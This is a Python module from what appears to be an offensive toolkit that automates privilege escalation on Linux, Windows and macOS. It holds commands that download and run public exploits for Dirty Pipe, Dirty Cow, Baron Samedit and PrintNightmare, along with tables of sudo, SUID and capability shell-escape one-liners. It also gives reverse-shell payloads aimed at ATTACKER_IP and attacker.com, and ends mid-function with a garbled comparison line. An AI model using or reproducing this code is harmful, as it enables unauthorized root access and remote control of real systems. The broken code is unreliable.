#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
privilege_escalation.py - Advanced Privilege Escalation Techniques
Cross-platform privilege escalation methods and exploitation
"""

import os
import sys
import stat
import subprocess
import shlex
import shutil
import tempfile
import platform
import ctypes
import json
import base64
import hashlib
import time
import threading
import queue
import re
import socket
import struct
import random
import string
from typing import Dict, List, Optional, Tuple, Any, Union, Callable
from datetime import datetime
from dataclasses import dataclass, asdict
from enum import Enum
import urllib.request
import urllib.error

# Import utilities
from ..utils.logger import get_logger
from ..utils.encryption import AES256Manager
from ..utils.obfuscation import ObfuscationManager
from ..utils.evasion import EvasionManager
from ..security.audit_log import get_audit_log_manager, AuditEventType, AuditSeverity

logger = get_logger()
audit_log = get_audit_log_manager()

class EscalationMethod(Enum):
    """Privilege escalation methods"""
    SUID_BINARY = "suid_binary"
    SUDO_MISCONFIG = "sudo_misconfig"
    CAPABILITIES = "capabilities"
    CRONTAB = "crontab"
    SERVICE_EXPLOIT = "service_exploit"
    KERNEL_EXPLOIT = "kernel_exploit"
    DLL_HIJACKING = "dll_hijacking"
    PATH_HIJACKING = "path_hijacking"
    WINDOWS_SERVICE = "windows_service"
    TOKEN_IMPERSONATION = "token_impersonation"
    UAC_BYPASS = "uac_bypass"
    MACOS_TCC = "macos_tcc"
    CONTAINER_ESCAPE = "container_escape"
    CUSTOM = "custom"

class EscalationResult(Enum):
    """Escalation attempt results"""
    SUCCESS = "success"
    FAILED = "failed"
    PARTIAL = "partial"
    NOT_APPLICABLE = "not_applicable"
    PERMISSION_DENIED = "permission_denied"

@dataclass
class EscalationAttempt:
    """Escalation attempt information"""
    method: EscalationMethod
    result: EscalationResult
    command: Optional[str] = None
    output: Optional[str] = None
    error: Optional[str] = None
    execution_time: float = 0.0
    privilege_level: Optional[str] = None
    timestamp: datetime = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now()
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        data = asdict(self)
        data['method'] = self.method.value
        data['result'] = self.result.value
        data['timestamp'] = self.timestamp.isoformat()
        return data

@dataclass
class SystemInfo:
    """System information for privilege escalation"""
    platform: str
    architecture: str
    kernel_version: str
    os_version: str
    hostname: str
    current_user: str
    is_admin: bool
    is_root: bool
    users: List[str]
    groups: List[str]
    sudo_version: Optional[str] = None
    windows_build: Optional[str] = None
    macos_version: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return asdict(self)

class PrivilegeEscalation:
    """Advanced Privilege Escalation Techniques"""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        
        # Configuration
        self.aggressive_mode = self.config.get('aggressive_mode', False)
        self.stealth_mode = self.config.get('stealth_mode', False)
        self.max_attempts = self.config.get('max_attempts', 10)
        self.timeout = self.config.get('timeout', 30)
        self.payload_dir = self.config.get('payload_dir', tempfile.gettempdir())
        
        # System information
        self.system_info = self._collect_system_info()
        
        # Exploit database
        self.exploits = self._load_exploits()
        
        # Payload generator
        self.payload_generator = PayloadGenerator()
        
        # Evasion manager
        self.evasion = EvasionManager()
        
        # Obfuscation manager
        self.obfuscation = ObfuscationManager()
        
        # Statistics
        self.stats = {
            'attempts_made': 0,
            'successful_escalations': 0,
            'failed_attempts': 0,
            'methods_tried': set(),
            'start_time': datetime.now()
        }
        
        # Attempt history
        self.attempt_history = []
        
        # Cache for detection results
        self.detection_cache = {}
        
        logger.info("Privilege Escalation initialized", module="privilege_escalation")
    
    def _collect_system_info(self) -> SystemInfo:
        """Collect system information"""
        platform_system = platform.system()
        architecture = platform.machine()
        kernel_version = platform.release()
        os_version = platform.version()
        hostname = socket.gethostname()
        
        # Get current user
        current_user = os.environ.get('USER') or os.environ.get('USERNAME') or 'unknown'
        
        # Check privileges
        is_admin = False
        is_root = False
        
        if platform_system == 'Windows':
            # Check if running as administrator on Windows
            try:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            except:
                is_admin = False
        else:
            # Check if running as root on Unix-like systems
            is_root = os.geteuid() == 0
        
        # Get users and groups
        users = []
        groups = []
        
        try:
            if platform_system == 'Windows':
                # Windows users (simplified)
                users = ['Administrator', 'Guest', current_user]
                groups = ['Administrators', 'Users', 'Guests']
            else:
                # Unix users and groups
                import pwd
                import grp
                
                users = [p.pw_name for p in pwd.getpwall()]
                groups = [g.gr_name for g in grp.getgrall()]
        except:
            pass
        
        # Get sudo version (Unix)
        sudo_version = None
        if platform_system != 'Windows':
            try:
                result = subprocess.run(['sudo', '--version'], 
                                       capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    # Extract version from output
                    match = re.search(r'Sudo version (\d+\.\d+\.\d+)', result.stdout)
                    if match:
                        sudo_version = match.group(1)
            except:
                pass
        
        # Windows specific
        windows_build = None
        if platform_system == 'Windows':
            try:
                import winreg
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                                   r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
                windows_build, _ = winreg.QueryValueEx(key, "CurrentBuild")
                winreg.CloseKey(key)
            except:
                pass
        
        # macOS specific
        macos_version = None
        if platform_system == 'Darwin':
            try:
                result = subprocess.run(['sw_vers', '-productVersion'], 
                                       capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    macos_version = result.stdout.strip()
            except:
                pass
        
        return SystemInfo(
            platform=platform_system,
            architecture=architecture,
            kernel_version=kernel_version,
            os_version=os_version,
            hostname=hostname,
            current_user=current_user,
            is_admin=is_admin,
            is_root=is_root,
            users=users,
            groups=groups,
            sudo_version=sudo_version,
            windows_build=windows_build,
            macos_version=macos_version
        )
    
    def _load_exploits(self) -> Dict[str, List[Dict]]:
        """Load exploit database"""
        exploits = {
            'linux': [],
            'windows': [],
            'macos': [],
            'generic': []
        }
        
        # Linux exploits
        exploits['linux'] = [
            {
                'name': 'Dirty Pipe (CVE-2022-0847)',
                'cve': 'CVE-2022-0847',
                'description': 'Linux kernel vulnerability allowing overwriting of arbitrary read-only files',
                'min_kernel': '5.8',
                'max_kernel': '5.16.11',
                'command': 'curl -s https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c | gcc -o /tmp/dirtypipe - && chmod +x /tmp/dirtypipe && /tmp/dirtypipe',
                'check_command': 'uname -r'
            },
            {
                'name': 'Dirty Cow (CVE-2016-5195)',
                'cve': 'CVE-2016-5195',
                'description': 'Race condition in memory mapping handling',
                'min_kernel': '2.6.22',
                'max_kernel': '4.8.3',
                'command': 'curl -s https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c | gcc -pthread dirtyc0w.c -o dirtyc0w && ./dirtyc0w',
                'check_command': 'uname -r'
            },
            {
                'name': 'Sudo Baron Samedit (CVE-2021-3156)',
                'cve': 'CVE-2021-3156',
                'description': 'Heap-based buffer overflow in sudo',
                'min_sudo': '1.8.2',
                'max_sudo': '1.8.31p2',
                'command': 'curl -s https://raw.githubusercontent.com/blasty/CVE-2021-3156/main/exploit_nss.py | python3',
                'check_command': 'sudo --version'
            }
        ]
        
        # Windows exploits
        exploits['windows'] = [
            {
                'name': 'PrintNightmare (CVE-2021-34527)',
                'cve': 'CVE-2021-34527',
                'description': 'Remote code execution in Windows Print Spooler',
                'min_build': '10240',
                'max_build': '19043',
                'command': 'powershell -c "Invoke-WebRequest -Uri https://raw.githubusercontent.com/calebstewart/CVE-2021-34527/main/CVE-2021-34527.ps1 -OutFile C:\\Windows\\Temp\\printnightmare.ps1; Import-Module C:\\Windows\\Temp\\printnightmare.ps1; Invoke-PrintNightmare"',
                'check_command': 'systeminfo | findstr /B /C:"OS Version"'
            },
            {
                'name': 'EternalBlue (MS17-010)',
                'cve': 'CVE-2017-0144',
                'description': 'Remote code execution via SMBv1',
                'min_build': '7600',
                'max_build': '15063',
                'command': 'python3 -c "import sys; sys.path.append(\'/tmp\'); import eternalblue; eternalblue.exploit()"',
                'check_command': 'systeminfo | findstr /B /C:"OS Version"'
            }
        ]
        
        # Generic methods
        exploits['generic'] = [
            {
                'name': 'SUID Binary Exploitation',
                'description': 'Find and exploit SUID binaries',
                'command': 'find / -perm -4000 -type f 2>/dev/null',
                'check_command': 'find / -perm -4000 -type f 2>/dev/null | head -5'
            },
            {
                'name': 'Sudo Misconfiguration',
                'description': 'Check sudo permissions for current user',
                'command': 'sudo -l',
                'check_command': 'sudo -l 2>/dev/null'
            },
            {
                'name': 'Crontab Entries',
                'description': 'Check crontab for writable entries',
                'command': 'cat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/* 2>/dev/null',
                'check_command': 'ls -la /etc/cron* /var/spool/cron/crontabs/ 2>/dev/null'
            }
        ]
        
        return exploits
    
    def check_current_privileges(self) -> Dict[str, Any]:
        """Check current privilege level"""
        result = {
            'platform': self.system_info.platform,
            'current_user': self.system_info.current_user,
            'is_admin': self.system_info.is_admin,
            'is_root': self.system_info.is_root,
            'uid': None,
            'gid': None,
            'groups': []
        }
        
        if self.system_info.platform != 'Windows':
            try:
                result['uid'] = os.getuid()
                result['gid'] = os.getgid()
                
                # Get groups
                import grp
                groups = []
                for g in os.getgroups():
                    try:
                        groups.append(grp.getgrgid(g).gr_name)
                    except:
                        groups.append(str(g))
                result['groups'] = groups
            except:
                pass
        
        return result
    
    def enumerate_system(self) -> Dict[str, Any]:
        """Enumerate system for privilege escalation vectors"""
        vectors = {
            'suid_binaries': [],
            'sudo_commands': [],
            'cron_jobs': [],
            'writable_files': [],
            'capabilities': [],
            'services': [],
            'kernel_info': {},
            'network_info': {},
            'user_info': {}
        }
        
        start_time = time.time()
        
        try:
            # SUID binaries (Unix)
            if self.system_info.platform != 'Windows':
                vectors['suid_binaries'] = self._find_suid_binaries()
            
            # Sudo commands (Unix)
            if self.system_info.platform != 'Windows':
                vectors['sudo_commands'] = self._check_sudo_permissions()
            
            # Cron jobs
            vectors['cron_jobs'] = self._find_cron_jobs()
            
            # Writable files
            vectors['writable_files'] = self._find_writable_files()
            
            # Linux capabilities
            if self.system_info.platform == 'Linux':
                vectors['capabilities'] = self._find_capabilities()
            
            # Services
            vectors['services'] = self._enumerate_services()
            
            # Kernel information
            vectors['kernel_info'] = self._get_kernel_info()
            
            # Network information
            vectors['network_info'] = self._get_network_info()
            
            # User information
            vectors['user_info'] = self._get_user_info()
            
        except Exception as e:
            logger.error(f"System enumeration error: {e}", module="privilege_escalation")
        
        vectors['enumeration_time'] = time.time() - start_time
        vectors['timestamp'] = datetime.now().isoformat()
        
        return vectors
    
    def _find_suid_binaries(self) -> List[Dict[str, Any]]:
        """Find SUID binaries on Unix systems"""
        suid_binaries = []
        
        try:
            # Find SUID binaries
            cmd = "find / -perm -4000 -type f 2>/dev/null"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                for binary in result.stdout.strip().split('\n'):
                    if binary:
                        try:
                            # Get file info
                            stat_info = os.stat(binary)
                            
                            # Check if binary is known vulnerable
                            known_vulnerable = self._check_suid_vulnerability(binary)
                            
                            suid_binaries.append({
                                'path': binary,
                                'size': stat_info.st_size,
                                'owner': stat_info.st_uid,
                                'group': stat_info.st_gid,
                                'permissions': oct(stat_info.st_mode)[-4:],
                                'known_vulnerable': known_vulnerable,
                                'exploit_suggested': self._suggest_suid_exploit(binary)
                            })
                        except:
                            suid_binaries.append({
                                'path': binary,
                                'known_vulnerable': False
                            })
            
        except Exception as e:
            logger.debug(f"SUID binary search error: {e}", module="privilege_escalation")
        
        return suid_binaries
    
    def _check_suid_vulnerability(self, binary_path: str) -> bool:
        """Check if SUID binary is known to be vulnerable"""
        vulnerable_binaries = [
            '/bin/bash',
            '/bin/csh',
            '/bin/dash',
            '/bin/ksh',
            '/bin/mount',
            '/bin/ping',
            '/bin/su',
            '/bin/umount',
            '/usr/bin/chfn',
            '/usr/bin/chsh',
            '/usr/bin/gpasswd',
            '/usr/bin/newgrp',
            '/usr/bin/passwd',
            '/usr/bin/sudo',
            '/usr/bin/traceroute',
            '/usr/local/bin/sudo'
        ]
        
        # Check against known vulnerable binaries
        if binary_path in vulnerable_binaries:
            return True
        
        # Check for known vulnerable patterns
        vulnerable_patterns = [
            'nmap', 'vim', 'find', 'awk', 'perl', 'python',
            'ruby', 'lua', 'expect', 'more', 'less', 'man'
        ]
        
        binary_name = os.path.basename(binary_path)
        for pattern in vulnerable_patterns:
            if pattern in binary_name.lower():
                return True
        
        return False
    
    def _suggest_suid_exploit(self, binary_path: str) -> Optional[str]:
        """Suggest exploit for SUID binary"""
        binary_name = os.path.basename(binary_path).lower()
        
        exploit_suggestions = {
            'bash': 'bash -p',
            'sh': 'sh -p',
            'dash': 'dash -p',
            'ksh': 'ksh -p',
            'zsh': 'zsh',
            'python': 'python -c "import os; os.setuid(0); os.system(\'/bin/bash\')"',
            'python2': 'python2 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"',
            'python3': 'python3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"',
            'perl': 'perl -e \'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";\'',
            'ruby': 'ruby -e \'Process::Sys.setuid(0); exec "/bin/bash"\'',
            'find': 'find . -exec /bin/bash \\;',
            'awk': 'awk \'BEGIN {system("/bin/bash")}\'',
            'vim': 'vim -c \':!/bin/bash\'',
            'nmap': 'nmap --interactive && !sh',
            'more': 'more /etc/passwd && !/bin/bash',
            'less': 'less /etc/passwd && !/bin/bash',
            'man': 'man man && !/bin/bash'
        }
        
        return exploit_suggestions.get(binary_name)
    
    def _check_sudo_permissions(self) -> List[Dict[str, Any]]:
        """Check sudo permissions for current user"""
        sudo_commands = []
        
        try:
            # Run sudo -l to list allowed commands
            cmd = "sudo -l 2>/dev/null"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                
                for line in lines:
                    line = line.strip()
                    
                    # Parse sudo -l output
                    if line.startswith('(') and 'NOPASSWD:' in line:
                        # Extract command
                        match = re.search(r'NOPASSWD:\s*(.+)$', line)
                        if match:
                            command = match.group(1).strip()
                            
                            # Check if command can be exploited
                            exploitable = self._check_sudo_exploit(command)
                            
                            sudo_commands.append({
                                'command': command,
                                'no_password': True,
                                'exploitable': exploitable,
                                'exploit_suggestion': self._suggest_sudo_exploit(command)
                            })
                    
                    elif 'ALL' in line and 'NOPASSWD' in line:
                        # User can run ALL commands without password
                        sudo_commands.append({
                            'command': 'ALL',
                            'no_password': True,
                            'exploitable': True,
                            'exploit_suggestion': 'sudo su -'
                        })
            
        except Exception as e:
            logger.debug(f"Sudo permission check error: {e}", module="privilege_escalation")
        
        return sudo_commands
    
    def _check_sudo_exploit(self, command: str) -> bool:
        """Check if sudo command can be exploited"""
        # Commands that can lead to privilege escalation
        dangerous_commands = [
            'su', 'bash', 'sh', 'zsh', 'ksh', 'dash',
            'python', 'python2', 'python3', 'perl', 'ruby',
            'vim', 'nano', 'less', 'more', 'man',
            'find', 'awk', 'sed', 'grep',
            'cp', 'mv', 'cat', 'echo',
            'curl', 'wget', 'nc', 'netcat',
            'chmod', 'chown', 'chattr',
            'systemctl', 'service',
            'ALL', 'NOPASSWD'
        ]
        
        command_lower = command.lower()
        
        for dangerous in dangerous_commands:
            if dangerous.lower() in command_lower:
                return True
        
        # Check for wildcards
        if '*' in command or '?' in command:
            return True
        
        return False
    
    def _suggest_sudo_exploit(self, command: str) -> Optional[str]:
        """Suggest exploit for sudo command"""
        command_lower = command.lower()
        
        exploit_suggestions = {
            'su': 'sudo su -',
            'bash': 'sudo bash',
            'sh': 'sudo sh',
            'python': 'sudo python -c "import os; os.system(\'/bin/bash\')"',
            'python2': 'sudo python2 -c "import os; os.system(\'/bin/bash\')"',
            'python3': 'sudo python3 -c "import os; os.system(\'/bin/bash\')"',
            'perl': 'sudo perl -e \'exec "/bin/bash"\'',
            'vim': 'sudo vim -c \':!/bin/bash\'',
            'find': 'sudo find . -exec /bin/bash \\;',
            'awk': 'sudo awk \'BEGIN {system("/bin/bash")}\'',
            'less': 'sudo less /etc/passwd && !/bin/bash',
            'more': 'sudo more /etc/passwd && !/bin/bash',
            'man': 'sudo man man && !/bin/bash',
            'cp': 'sudo cp /bin/bash /tmp/bash && sudo chmod +s /tmp/bash && /tmp/bash -p',
            'chmod': 'sudo chmod +s /bin/bash && /bin/bash -p',
            'chown': 'sudo chown root:root /bin/bash && sudo chmod +s /bin/bash && /bin/bash -p',
            'curl': 'sudo curl -o /tmp/bash http://attacker.com/bash && sudo chmod +x /tmp/bash && /tmp/bash',
            'wget': 'sudo wget -O /tmp/bash http://attacker.com/bash && sudo chmod +x /tmp/bash && /tmp/bash',
            'nc': 'sudo nc -e /bin/bash attacker.com 4444',
            'netcat': 'sudo netcat -e /bin/bash attacker.com 4444',
            'systemctl': 'sudo systemctl start evil.service',
            'service': 'sudo service evil start'
        }
        
        # Check for partial matches
        for key, exploit in exploit_suggestions.items():
            if key in command_lower:
                return exploit
        
        # Check for ALL command
        if 'all' in command_lower:
            return 'sudo su -'
        
        return None
    
    def _find_cron_jobs(self) -> List[Dict[str, Any]]:
        """Find cron jobs"""
        cron_jobs = []
        
        try:
            # Common cron locations
            cron_locations = [
                '/etc/crontab',
                '/etc/cron.d/',
                '/etc/cron.daily/',
                '/etc/cron.hourly/',
                '/etc/cron.monthly/',
                '/etc/cron.weekly/',
                '/var/spool/cron/crontabs/'
            ]
            
            for location in cron_locations:
                try:
                    if os.path.isfile(location):
                        # Read file
                        with open(location, 'r') as f:
                            content = f.read()
                        
                        # Parse cron entries
                        entries = self._parse_cron_entries(content, location)
                        cron_jobs.extend(entries)
                    
                    elif os.path.isdir(location):
                        # Read directory
                        for filename in os.listdir(location):
                            filepath = os.path.join(location, filename)
                            if os.path.isfile(filepath):
                                with open(filepath, 'r') as f:
                                    content = f.read()
                                
                                entries = self._parse_cron_entries(content, filepath)
                                cron_jobs.extend(entries)
                
                except Exception as e:
                    logger.debug(f"Cron location error {location}: {e}", module="privilege_escalation")
                    continue
            
        except Exception as e:
            logger.debug(f"Cron job search error: {e}", module="privilege_escalation")
        
        return cron_jobs
    
    def _parse_cron_entries(self, content: str, source: str) -> List[Dict[str, Any]]:
        """Parse cron entries from content"""
        entries = []
        
        lines = content.strip().split('\n')
        
        for line in lines:
            line = line.strip()
            
            # Skip comments and empty lines
            if not line or line.startswith('#'):
                continue
            
            # Parse cron entry
            parts = line.split()
            if len(parts) >= 6:
                # Standard cron format: minute hour day month day_of_week command
                minute, hour, day, month, day_of_week = parts[:5]
                command = ' '.join(parts[5:])
                
                # Check if command is writable or exploitable
                exploitable = self._check_cron_exploit(command)
                
                entries.append({
                    'schedule': f'{minute} {hour} {day} {month} {day_of_week}',
                    'command': command,
                    'source': source,
                    'exploitable': exploitable,
                    'exploit_suggestion': self._suggest_cron_exploit(command) if exploitable else None
                })
        
        return entries
    
    def _check_cron_exploit(self, command: str) -> bool:
        """Check if cron command can be exploited"""
        # Check for writable files in command
        writable_patterns = [
            r'(\S+\.(sh|py|pl|rb|php))',  # Script files
            r'(\S+\.(conf|config|ini))',   # Config files
            r'(\S+\.(log|txt|out))'        # Log files
        ]
        
        for pattern in writable_patterns:
            matches = re.findall(pattern, command)
            for match in matches:
                if isinstance(match, tuple):
                    filepath = match[0]
                else:
                    filepath = match
                
                # Check if file exists and is writable
                if os.path.exists(filepath):
                    try:
                        if os.access(filepath, os.W_OK):
                            return True
                    except:
                        pass
        
        # Check for commands that can be hijacked via PATH
        simple_commands = ['bash', 'sh', 'python', 'perl', 'curl', 'wget']
        for cmd in simple_commands:
            if cmd in command.lower():
                return True
        
        return False
    
    def _suggest_cron_exploit(self, command: str) -> Optional[str]:
        """Suggest exploit for cron command"""
        # Extract file paths from command
        file_patterns = [
            r'(\S+\.(sh|py|pl|rb|php))',
            r'(\S+\.(conf|config|ini))',
            r'(\S+\.(log|txt|out))'
        ]
        
        for pattern in file_patterns:
            matches = re.findall(pattern, command)
            for match in matches:
                if isinstance(match, tuple):
                    filepath = match[0]
                else:
                    filepath = match
                
                if os.path.exists(filepath):
                    # Check if writable
                    if os.access(filepath, os.W_OK):
                        # Suggest adding reverse shell
                        if filepath.endswith('.sh'):
                            return f'echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> {filepath}'
                        elif filepath.endswith('.py'):
                            return f'echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"ATTACKER_IP\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);" >> {filepath}'
        
        return None
    
    def _find_writable_files(self) -> List[Dict[str, Any]]:
        """Find writable files in common locations"""
        writable_files = []
        
        try:
            # Common writable locations
            common_locations = [
                '/tmp',
                '/var/tmp',
                '/dev/shm',
                '/home',
                '/opt',
                '/usr/local',
                '/etc/cron.d',
                '/etc/cron.hourly',
                '/etc/cron.daily',
                '/etc/cron.weekly',
                '/etc/cron.monthly',
                '/var/spool/cron/crontabs'
            ]
            
            for location in common_locations:
                if os.path.exists(location):
                    try:
                        # Check if location is writable
                        if os.access(location, os.W_OK):
                            writable_files.append({
                                'path': location,
                                'type': 'directory',
                                'writable': True,
                                'exploitable': True
                            })
                    except:
                        pass
            
        except Exception as e:
            logger.debug(f"Writable files search error: {e}", module="privilege_escalation")
        
        return writable_files
    
    def _find_capabilities(self) -> List[Dict[str, Any]]:
        """Find Linux capabilities"""
        capabilities = []
        
        try:
            # Use getcap to find files with capabilities
            cmd = "getcap -r / 2>/dev/null"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                lines = result.stdout.strip().split('\n')
                
                for line in lines:
                    if line:
                        parts = line.split('=')
                        if len(parts) == 2:
                            filepath = parts[0].strip()
                            caps = parts[1].strip()
                            
                            # Check if capabilities are dangerous
                            dangerous = self._check_dangerous_capabilities(caps)
                            
                            capabilities.append({
                                'file': filepath,
                                'capabilities': caps,
                                'dangerous': dangerous,
                                'exploit_suggestion': self._suggest_capability_exploit(caps, filepath) if dangerous else None
                            })
            
        except Exception as e:
            logger.debug(f"Capabilities search error: {e}", module="privilege_escalation")
        
        return capabilities
    
    def _check_dangerous_capabilities(self, capabilities: str) -> bool:
        """Check if capabilities are dangerous"""
        dangerous_caps = [
            'cap_dac_override',      # Bypass file read, write, execute permission checks
            'cap_dac_read_search',   # Bypass file read permission checks and directory read/execute
            'cap_sys_admin',         # Perform a range of system administration operations
            'cap_sys_ptrace',        # Trace arbitrary processes
            'cap_sys_module',        # Insert kernel modules
            'cap_sys_rawio',         # Perform I/O port operations
            'cap_sys_chroot',        # Use chroot()
            'cap_setuid',            # Set UID
            'cap_setgid',            # Set GID
            'cap_setpcap',           # Set capabilities
            'cap_net_raw',           # Use RAW and PACKET sockets
            'cap_net_admin',         # Perform various network-related operations
            'cap_sys_boot',          # Reboot system
            'cap_linux_immutable',   # Set FS immutable flag
            'cap_ipc_lock',          # Lock memory
            'cap_ipc_owner',         # Bypass permission checks for System V IPC
            'cap_sys_resource',      # Override resource limits
            'cap_sys_time',          # Set system clock
            'cap_sys_tty_config',    # Configure TTY devices
            'cap_mknod',             # Create special files with mknod()
            'cap_lease',             # Establish leases on arbitrary files
            'cap_audit_write',       # Write records to kernel auditing log
            'cap_audit_control',     # Enable and disable kernel auditing
            'cap_setfcap',           # Set file capabilities
            'cap_mac_override',      # Override Mandatory Access Control
            'cap_mac_admin',         # Configure MAC configuration
            'cap_syslog',            # Perform privileged syslog operations
            'cap_wake_alarm',        # Trigger something that will wake up the system
            'cap_block_suspend',     # Employ features that can block system suspend
            'cap_audit_read'         # Read audit log
        ]
        
        for dangerous in dangerous_caps:
            if dangerous in capabilities:
                return True
        
        return False
    
    def _suggest_capability_exploit(self, capabilities: str, filepath: str) -> Optional[str]:
        """Suggest exploit for capabilities"""
        exploit_suggestions = {
            'cap_dac_override': f'{filepath} /etc/shadow',
            'cap_dac_read_search': f'{filepath} /etc/shadow',
            'cap_setuid': f'{filepath} -c "python3 -c \\"import os; os.setuid(0); os.system(\\"/bin/bash\\")\\""',
            'cap_setgid': f'{filepath} -c "python3 -c \\"import os; os.setgid(0); os.system(\\"/bin/bash\\")\\""',
            'cap_sys_admin': f'{filepath} mount -o bind /bin/bash /tmp/bash && /tmp/bash -p',
            'cap_sys_ptrace': f'{filepath} -p $(pidof bash)',
            'cap_sys_module': f'{filepath} insmod evil.ko',
            'cap_net_raw': f'{filepath} tcpdump -i any',
            'cap_net_admin': f'{filepath} ip link set eth0 promisc on'
        }
        
        for cap, exploit in exploit_suggestions.items():
            if cap in capabilities:
                return exploit
        
        return None
    
    def _enumerate_services(self) -> List[Dict[str, Any]]:
        """Enumerate services"""
        services = []
        
        try:
            if self.system_info.platform == 'Linux':
                # Systemd services
                try:
                    cmd = "systemctl list-units --type=service --all --no-pager 2>/dev/null"
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                    
                    if result.returncode == 0:
                        lines = result.stdout.strip().split('\n')
                        
                        for line in lines[1:]:  # Skip header
                            parts = line.split()
                            if len(parts) >= 4:
                                service_name = parts[0]
                                status = parts[3]
                                
                                services.append({
                                    'name': service_name,
                                    'status': status,
                                    'type': 'systemd',
                                    'exploitable': self._check_service_exploit(service_name)
                                })
                except:
                    pass
            
            elif self.system_info.platform == 'Windows':
                # Windows services via sc
                try:
                    cmd = "sc query state= all 2>&1"
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
                    
                    if result.returncode == 0:
                        lines = result.stdout.strip().split('\n')
                        
                        for line in lines:
                            if 'SERVICE_NAME:' in line:
                                service_name = line.split(':', 1)[1].strip()
                                
                                services.append({
                                    'name': service_name,
                                    'status': 'unknown',
                                    'type': 'windows',
                                    'exploitable': self._check_service_exploit(service_name)
                                })
                except:
                    pass
            
        except Exception as e:
            logger.debug(f"Service enumeration error: {e}", module="privilege_escalation")
        
        return services
    
    def _check_service_exploit(self, service_name: str) -> bool:
        """Check if service can be exploited"""
        # Known vulnerable services
        vulnerable_services = [
            'mysql', 'apache', 'nginx', 'tomcat',
            'docker', 'redis', 'memcached', 'elasticsearch',
            'mongodb', 'postgresql', 'varnish', 'squid',
            'vsftpd', 'proftpd', 'pure-ftpd',
            'ssh', 'telnet', 'ftp',
            'smbd', 'nmbd', 'winbind',
            'cups', 'avahi', 'mdns',
            'x11', 'vnc', 'rdp',
            'printspooler', 'spooler'
        ]
        
        service_lower = service_name.lower()
        
        for vulnerable in vulnerable_services:
            if vulnerable in service_lower:
                return True
        
        return False
    
    def _get_kernel_info(self) -> Dict[str, Any]:
        """Get kernel information"""
        kernel_info = {}
        
        try:
            if self.system_info.platform == 'Linux':
                # Get kernel version
                cmd = "uname -a"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                
                if result.returncode == 0:
                    kernel_info['uname'] = result.stdout.strip()
                
                # Get kernel modules
                cmd = "lsmod"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                
                if result.returncode == 0:
                    kernel_info['modules'] = result.stdout.strip().split('\n')[1:]  # Skip header
                
                # Check for known vulnerabilities
                kernel_info['vulnerabilities'] = self._check_kernel_vulnerabilities()
            
            elif self.system_info.platform == 'Windows':
                # Get Windows version
                cmd = "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\""
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
                
                if result.returncode == 0:
                    kernel_info['systeminfo'] = result.stdout.strip()
            
        except Exception as e:
            logger.debug(f"Kernel info error: {e}", module="privilege_escalation")
        
        return kernel_info
    
    def _check_kernel_vulnerabilities(self) -> List[Dict[str, Any]]:
        """Check for known kernel vulnerabilities"""
        vulnerabilities = []
        
        try:
            # Get kernel version
            cmd = "uname -r"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                kernel_version = result.stdout.strip()
                
                # Check against known exploits
                for exploit in self.exploits['linux']:
                    if 'min_kernel' in exploit and 'max_kernel' in exploit:
                        min_kernel = exploit['min_kernel']
                        max_kernel = exploit['max_kernel']
                        
                        # Simple version comparison
                        if self._compare_kernel_versions(kernel_version, min_kernel) >= 0 and \
                           self._compare_kernel_versions(kernel_version, max_kernel) <= 0:
                            
                            vulnerabilities.append({
                                'name': exploit['name'],
                                'cve': exploit.get('cve', 'N/A'),
                                'description': exploit['description'],
                                'kernel_version': kernel_version,
                                'vulnerable': True,
                                'exploit_command': exploit.get('command')
                            })
        
        except Exception as e:
            logger.debug(f"Kernel vulnerability check error: {e}", module="privilege_escalation")
        
        return vulnerabilities
    
    def _compare_kernel_versions(self, v1: str, v2: str) -> int:
        """Compare kernel versions"""
        def normalize(v):
            return [int(x) for x in re.sub(r'[^0-9.]', '', v).split('.')]
        
        v1_norm = normalize(v1)
        v2_norm = normalize(v2)
        
        # Pad with zeros
        max_len = max(len(v1_norm), len(v2_norm))
        v1_norm += [0] * (max_len - len(v1_norm))
        v2_norm += [0] * (max_len - len(v2_norm))
        
        # Compare
        for i in range(max_len):
            if v1_norm[i] > v2_norm[i]:
                return 1
            elif v1_norm[i v2_norm[i]:
                return -1
        
        return 0
    
    def _get_network_info(self) -> Dict[str, Any]:
        """Get network information"""
        network_info = {}
        
        try:
            # Get IP addresses
            cmd = "ip addr show 2>/dev/null || ifconfig 2>/dev/null"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                network_info['interfaces'] = result.stdout.strip()
            
            # Get routing table
